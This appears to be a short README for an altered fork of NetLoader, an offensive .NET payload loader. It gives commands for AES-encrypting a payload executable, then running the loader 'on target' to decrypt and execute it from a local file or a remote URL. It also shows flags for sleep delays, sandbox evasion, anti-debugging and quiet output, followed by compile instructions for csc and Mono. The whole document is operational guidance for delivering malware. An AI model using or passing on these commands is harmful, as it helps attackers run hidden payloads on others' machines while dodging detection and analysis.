# Project altered from https://github.com/Flangvik/NetLoader/

# Stage a payload for the loader

python3 aes_encryptor.py --key 's3cr3t' --in payload.exe --out payload.exe.aes

OR

.\aes_encryptor.ps1 -Key 's3cr3t' -InFile payload.exe -OutFile payload.exe.aes

# Then on target

NetLoader.exe -aes 's3cr3t' -path C:\payload.exe.aes -sleep 30 -sandbox -anti-debug -quiet

NetLoader.exe -aes <passphrase> -path C:\payload.exe.aes

NetLoader.exe -enc -aes <passphrase> -path C:\payload.exe        # stage payload

NetLoader.exe -aes <passphrase> -path https://host/payload.aes -sleep 30 -sandbox -anti-debug -quiet


 
 # Compile (Windows, .NET Framework 4.7.2+):
 
 - csc /optimize+ /platform:anycpu /out:NetLoader.exe NetLoader_AES.cs
 
 # Compile (Mono):
 
 - mcs -optimize+ -out:NetLoader.exe NetLoader_AES.cs
